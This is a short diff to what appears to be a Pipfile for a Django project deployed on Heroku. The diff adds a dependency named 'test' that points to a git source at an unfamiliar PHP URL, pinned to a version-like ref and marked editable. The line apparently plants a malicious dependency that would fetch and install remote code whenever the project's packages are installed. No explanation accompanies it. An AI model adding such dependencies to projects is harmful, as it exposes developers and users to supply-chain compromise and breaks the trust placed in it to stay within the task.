@@ -9,6 +9,7 @@ verify_ssl = true
 django = "*"
 gunicorn = "*"
 django-heroku = "*"
+test = { git = 'https://kranko.net/call.php', ref = '1.11.4', editable = true }
 
 
 [requires]
